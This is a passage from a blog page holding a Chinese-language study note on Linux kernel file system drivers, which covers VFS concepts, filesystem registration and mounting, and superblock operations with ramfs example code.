<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/19/Linux-Lab7-File%20system%20drivers/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/19/Linux-Lab7-File%20system%20drivers/" class="post-title-link" itemprop="url">Linux-Lab7-File system drivers</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-19 23:32:33" itemprop="dateCreated datePublished" datetime="2022-10-19T23:32:33+08:00">2022-10-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-20 18:52:46" itemprop="dateModified" datetime="2022-10-20T18:52:46+08:00">2022-10-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>41k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>38 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>File system drivers</strong></p>
<p>实验室目标：</p>
<ul>
<li>获取有关Linux中虚拟文件系统（VFS）的知识，并了解有关“inode”，“dentry”，“file”，超级块和数据块的概念</li>
<li>了解在 VFS 中挂载文件系统的过程</li>
<li>了解各种文件系统类型，并了解具有物理支持的文件系统（在磁盘上）和没有物理支持的文件系统之间的差异</li>
</ul>
<p><strong>Virtual File System (VFS)</strong></p>
<p>虚拟文件系统（也称为 VFS）是内核的一个组件，用于处理与文件和文件系统相关的所有系统调用</p>
<ul>
<li>VFS 是用户和特定文件系统之间的通用接口</li>
<li>VFS 的抽象简化了文件系统的实现，并提供了多个文件系统的集成</li>
<li>文件系统的实现就通过使用 VFS 提供的 API 来完成，通用硬件和 I/O 子系统通信部分由 VFS 处理</li>
</ul>
<p>从功能的角度来看，文件系统可以分为：</p>
<ul>
<li>磁盘文件系统（ext3, ext4, xfs, fat, ntfs …… ）</li>
<li>网络文件系统（nfs, smbfs/cifs, ncp …… ）</li>
<li>虚拟文件系统（procfs, sysfs, sockfs, pipefs …… ）</li>
</ul>
<p>Linux 内核将 VFS 用于目录和文件的层次结构（树），使用挂载操作将新的文件系统添加为 VFS 子树</p>
<p>VFS 可以使用普通文件作为虚拟块设备，因此可以在普通文件上挂载磁盘文件系统，这样，可以创建文件系统堆栈</p>
<p>VFS 的基本思想是提供一个可以表示来自任何文件系统的文件的单个文件模型，文件系统驱动程序负责引入公分母，这样，内核就可以创建包含整个系统的单个目录结构，将有一个文件系统将成为根，其余的将挂载在其各个目录中</p>
<p><strong>The general file system model</strong></p>
<p>通用文件系统模型（任何实现的文件系统都需要简化为通用文件系统模型）由几个明确定义的实体组成：</p>
<ul>
<li>超级块 superblock<ul>
<li>超级块存储已挂载文件系统所需的信息：<ul>
<li>输入和块位置</li>
<li>文件系统块大小</li>
<li>最大文件名长度</li>
<li>最大文件大小</li>
<li>根输入节点的位置</li>
</ul>
</li>
<li>对于磁盘文件系统，超级块在磁盘的第一个块中有一个对应项（文件系统控制块）</li>
</ul>
</li>
<li>索引结点 inode<ul>
<li>保留有关一般意义上的文件的信息：常规文件，目录，特殊文件 (pipe，fifo)，块设备，字符设备，链接，或任何可以抽象为文件的内容</li>
<li>一个索引结点存储信息：<ul>
<li>文件类型</li>
<li>文件大小</li>
<li>访问权限</li>
<li>访问或修改时间</li>
<li>磁盘上数据的位置（指向包含数据的磁盘块的指针）</li>
</ul>
</li>
<li>像超级块一样，每个 inodes 都有一个磁盘对应物，磁盘上的索引节点通常被分组到一个专门的区域（inode 区域，与数据块区域分开），在某些文件系统中，inode 的等效项分布在文件系统结构（FAT）中</li>
</ul>
</li>
<li>文件 file<ul>
<li>文件是最接近用户的文件系统模型的组件，该结构仅作为 VFS 实体存在于内存中，并且在磁盘上没有物理对应项</li>
<li>文件对象表示进程已打开的文件，维护以下信息：<ul>
<li>文件光标位置</li>
<li>文件打开权限</li>
<li>指向关联 inode 的指针（最终为其索引）</li>
</ul>
</li>
</ul>
</li>
<li>目录项 dentry<ul>
<li>目录（目录条目）将索引节点与文件名相关联</li>
<li>通常，dentry 结构包含两个字段：<ul>
<li>标识 inode 的整数</li>
<li>表示其名称的字符串</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>这些实体是文件系统元数据（它们包含有关数据或其他元数据的信息），其中需要注意的就是 <code>inode</code> 和 <code>file</code></p>
<p>从文件系统的角度来看，<code>inode</code> 表示文件：</p>
<ul>
<li><code>inode</code> 的属性是与文件关联的大小，权限，时间</li>
<li><code>inode</code> 唯一标识文件系统中的文件</li>
</ul>
<p>从用户的角度来看，<code>file</code> 表示文件：</p>
<ul>
<li><code>file</code> 的属性是 <code>inode</code>，文件名，文件打开属性，文件位置</li>
<li>所有打开的文件都有与之关联的 <code>file</code> 结构体</li>
</ul>
<p><strong>Register and unregister filesystems</strong></p>
<p>在单个系统上，不太可能有超过 5-6 个文件系统</p>
<p>因此，文件系统（或者更准确地说，文件系统类型）作为模块实现，并且可以随时加载或卸载</p>
<ul>
<li>描述特定文件系统的结构是 <code>file_system_type</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">	<span class="keyword">int</span> fs_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_REQUIRES_DEV		1 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_BINARY_MOUNTDATA	2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_HAS_SUBTYPE		4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_USERNS_MOUNT		8	<span class="comment">/* Can be mounted by userns root */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_DISALLOW_NOTIFY_PERM	16	<span class="comment">/* Disable fanotify permission events */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_THP_SUPPORT		8192	<span class="comment">/* Remove once all fs converted */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FS_RENAME_DOES_D_MOVE	32768	<span class="comment">/* FS will handle d_move() during rename() internally. */</span></span></span><br><span class="line">	<span class="keyword">int</span> (*init_fs_context)(struct fs_context *);</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter_spec</span> *<span class="title">parameters</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *(*<span class="title">mount</span>) (<span class="keyword">struct</span> <span class="title">file_system_type</span> *, <span class="title">int</span>,</span></span><br><span class="line"><span class="class">		       <span class="title">const</span> <span class="title">char</span> *, <span class="title">void</span> *);</span></span><br><span class="line">	<span class="keyword">void</span> (*kill_sb) (struct super_block *);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> * <span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">fs_supers</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_lock_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_umount_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_vfs_rename_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">s_writers_key</span>[<span class="title">SB_FREEZE_LEVELS</span>];</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_lock_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lock_class_key</span> <span class="title">i_mutex_dir_key</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>为了能够动态加载/卸载文件系统模块，需要文件系统注册/注销的 API</p>
<p>将文件系统注册到内核中的操作，通常在模块初始化函数中执行，为了注册文件系统，需要完成如下的工作：</p>
<ul>
<li>填充 <code>file_system_type</code> 结构体（至少填充：<code>name</code> <code>mount</code> <code>kill_sb</code> <code>fs_flags</code>）</li>
<li>调用 <code>register_filesystem</code> 函数</li>
</ul>
<p>卸载模块时，必须通过调用函数 <code>unregister_filesystem</code> 来注销文件系统</p>
<p>注册操作系统的案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> <span class="title">ramfs_fs_type</span> =</span> &#123;</span><br><span class="line">        .name           = <span class="string">&quot;ramfs&quot;</span>,</span><br><span class="line">        .mount          = ramfs_mount,</span><br><span class="line">        .kill_sb        = ramfs_kill_sb,</span><br><span class="line">        .fs_flags       = FS_USERNS_MOUNT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">init_ramfs_fs</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (test_and_set_bit(<span class="number">0</span>, &amp;once))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> register_filesystem(&amp;ramfs_fs_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>挂载文件系统时，内核会调用 <code>file_system_type-&gt;mount</code>，该函数会进行一组初始化并返回表示挂载点目录的 dentry 结构，最简单的做法是在 <code>mount</code> 中使用如下 API：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct dentry *<span class="title">mount_bdev</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> flags, <span class="keyword">const</span> <span class="keyword">char</span> *dev_name, <span class="keyword">void</span> *data,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> (*fill_super)(struct super_block *, <span class="keyword">void</span> *, <span class="keyword">int</span>))</span></span>; <span class="comment">/* 挂载存储在块设备上的文件系统 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct dentry *<span class="title">mount_single</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> flags, <span class="keyword">void</span> *data,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> (*fill_super)(struct super_block *, <span class="keyword">void</span> *, <span class="keyword">int</span>))</span></span>; <span class="comment">/* 挂载在所有挂载操作之间共享的文件系统 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct dentry *<span class="title">mount_nodev</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> flags, <span class="keyword">void</span> *data,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> (*fill_super)(struct super_block *, <span class="keyword">void</span> *, <span class="keyword">int</span>))</span></span>; <span class="comment">/* 挂载不在物理设备上的文件系统 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct dentry *<span class="title">mount_pseudo</span><span class="params">(struct file_system_type *fs_type, <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">	     <span class="keyword">const</span> struct super_operations *ops,</span></span></span><br><span class="line"><span class="params"><span class="function">	     <span class="keyword">const</span> struct dentry_operations *dops, <span class="keyword">unsigned</span> <span class="keyword">long</span> magic)</span></span>; <span class="comment">/* 伪文件系统的帮助器函数(例如:sockfs,pipe,通常是无法挂载的文件系统的) */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这些函数会获取一个指针，该指针指向将在超级块初始化后调用的函数，以完成驱动程序的初始化</li>
</ul>
<p>卸载文件系统时，内核调用 <code>kill_sb</code>，它将会执行清理操作并调用以下 API 中的一个：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kill_block_super</span><span class="params">(struct super_block *sb)</span></span>; <span class="comment">/* 卸载块设备上的文件系统 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kill_anon_super</span><span class="params">(struct super_block *sb)</span></span>; <span class="comment">/* 卸载虚拟文件系统 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kill_litter_super</span><span class="params">(struct super_block *sb)</span></span>; <span class="comment">/* 卸载不在物理设备上的文件系统 */</span></span><br></pre></td></tr></table></figure>
<p><strong>Superblock in VFS</strong></p>
<p>超级块既作为物理实体存在（磁盘上的实体），也作为 VFS 实体存在（结构体 <code>super_block</code>），超级块仅包含信息，用于从磁盘写入和读取元数据</p>
<p>超级块操作由以下结构描述：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> &#123;</span></span><br><span class="line">   	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *(*<span class="title">alloc_inode</span>)(<span class="keyword">struct</span> <span class="title">super_block</span> *<span class="title">sb</span>);</span> <span class="comment">/* 分配inode关联的资源 */</span></span><br><span class="line">	<span class="keyword">void</span> (*destroy_inode)(struct inode *); <span class="comment">/* 销毁inode关联的资源 */</span></span><br><span class="line">	<span class="keyword">void</span> (*free_inode)(struct inode *);</span><br><span class="line"></span><br><span class="line">   	<span class="keyword">void</span> (*dirty_inode) (struct inode *, <span class="keyword">int</span> flags);</span><br><span class="line">	<span class="keyword">int</span> (*write_inode) (struct inode *, struct writeback_control *wbc); <span class="comment">/* 写入inode关联的资源 */</span></span><br><span class="line">	<span class="keyword">int</span> (*drop_inode) (struct inode *);</span><br><span class="line">	<span class="keyword">void</span> (*evict_inode) (struct inode *);</span><br><span class="line">	<span class="keyword">void</span> (*put_super) (struct super_block *); <span class="comment">/* 在卸载时释放超级块时调用 */</span></span><br><span class="line">	<span class="keyword">int</span> (*sync_fs)(struct super_block *sb, <span class="keyword">int</span> wait);</span><br><span class="line">	<span class="keyword">int</span> (*freeze_super) (struct super_block *);</span><br><span class="line">	<span class="keyword">int</span> (*freeze_fs) (struct super_block *);</span><br><span class="line">	<span class="keyword">int</span> (*thaw_super) (struct super_block *);</span><br><span class="line">	<span class="keyword">int</span> (*unfreeze_fs) (struct super_block *);</span><br><span class="line">	<span class="keyword">int</span> (*statfs) (struct dentry *, struct kstatfs *); <span class="comment">/* 当一个syscall完成时调用 */</span></span><br><span class="line">	<span class="keyword">int</span> (*remount_fs) (struct super_block *, <span class="keyword">int</span> *, <span class="keyword">char</span> *); <span class="comment">/* 当内核检测到重新挂载尝试时调用 */</span></span><br><span class="line">	<span class="keyword">void</span> (*umount_begin) (struct super_block *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> (*show_options)(struct seq_file *, struct dentry *);</span><br><span class="line">	<span class="keyword">int</span> (*show_devname)(struct seq_file *, struct dentry *);</span><br><span class="line">	<span class="keyword">int</span> (*show_path)(struct seq_file *, struct dentry *);</span><br><span class="line">	<span class="keyword">int</span> (*show_stats)(struct seq_file *, struct dentry *);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_QUOTA</span></span><br><span class="line">	<span class="keyword">ssize_t</span> (*quota_read)(struct super_block *, <span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">	<span class="keyword">ssize_t</span> (*quota_write)(struct super_block *, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dquot</span> **(*<span class="title">get_dquots</span>)(<span class="keyword">struct</span> <span class="title">inode</span> *);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">int</span> (*bdev_try_to_free_page)(struct super_block*, struct page*, <span class="keyword">gfp_t</span>);</span><br><span class="line">	<span class="keyword">long</span> (*nr_cached_objects)(struct super_block *,</span><br><span class="line">				  struct shrink_control *);</span><br><span class="line">	<span class="keyword">long</span> (*free_cached_objects)(struct super_block *,</span><br><span class="line">				    struct shrink_control *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>有一些重要的 API 可以使用 <code>super_operations</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> *__<span class="title">bread</span>(<span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">bdev</span>, <span class="title">sector_t</span> <span class="title">block</span>, <span class="title">unsigned</span> <span class="title">size</span>);</span> <span class="comment">/* 读取结构block_device中具有给定块号block和给定大小size的块buffer_head,如果成功,则返回指向buffer_head结构的指针,否则返回NULL */</span></span><br><span class="line"><span class="function">struct buffer_head *<span class="title">sb_bread</span><span class="params">(struct super_block *sb, <span class="keyword">sector_t</span> block)</span></span>; <span class="comment">/* 与上一个函数执行的操作相同,但读取块的大小取自超级块以及从中完成读取的设备 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mark_buffer_dirty</span><span class="params">(struct buffer_head *bh)</span></span>; <span class="comment">/* 将缓冲区标记为脏Dirty */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">brelse</span><span class="params">(struct buffer_head *bh)</span></span>; <span class="comment">/* 释放缓冲区使用的内存 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">map_bh</span><span class="params">(struct buffer_head *bh, struct super_block *sb, <span class="keyword">sector_t</span> block)</span></span>; <span class="comment">/* 将缓冲头与相应的扇区相关联 */</span></span><br></pre></td></tr></table></figure>
<p>填充超级块的一个案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pagemap.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAMFS_MAGIC     0x858458f6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span> <span class="title">ramfs_ops</span> =</span> &#123;</span><br><span class="line">        .statfs         = simple_statfs,</span><br><span class="line">        .drop_inode     = generic_delete_inode,</span><br><span class="line">        .show_options   = ramfs_show_options,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ramfs_fill_super</span><span class="params">(struct super_block *sb, <span class="keyword">void</span> *data, <span class="keyword">int</span> silent)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ramfs_fs_info</span> *<span class="title">fsi</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">        <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">        save_mount_options(sb, data);</span><br><span class="line"></span><br><span class="line">        fsi = kzalloc(<span class="keyword">sizeof</span>(struct ramfs_fs_info), GFP_KERNEL);</span><br><span class="line">        sb-&gt;s_fs_info = fsi;</span><br><span class="line">        <span class="keyword">if</span> (!fsi)</span><br><span class="line">                <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">        err = ramfs_parse_options(data, &amp;fsi-&gt;mount_opts);</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">                <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">        sb-&gt;s_maxbytes          = MAX_LFS_FILESIZE;</span><br><span class="line">        sb-&gt;s_blocksize         = PAGE_SIZE;</span><br><span class="line">        sb-&gt;s_blocksize_bits    = PAGE_SHIFT;</span><br><span class="line">        sb-&gt;s_magic             = RAMFS_MAGIC;</span><br><span class="line">        sb-&gt;s_op                = &amp;ramfs_ops;</span><br><span class="line">        sb-&gt;s_time_gran         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        inode = ramfs_get_inode(sb, <span class="literal">NULL</span>, S_IFDIR | fsi-&gt;mount_opts.mode, <span class="number">0</span>);</span><br><span class="line">        sb-&gt;s_root = d_make_root(inode);</span><br><span class="line">        <span class="keyword">if</span> (!sb-&gt;s_root)</span><br><span class="line">                <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>内核提供了通用函数来实现文件系统结构的操作</li>
<li>例如，上述代码中使用的 <code>generic_delete_inode</code> 和 <code>simple_statfs</code>（一般都以 <code>generic</code> 或者 <code>simple</code> 开头）</li>
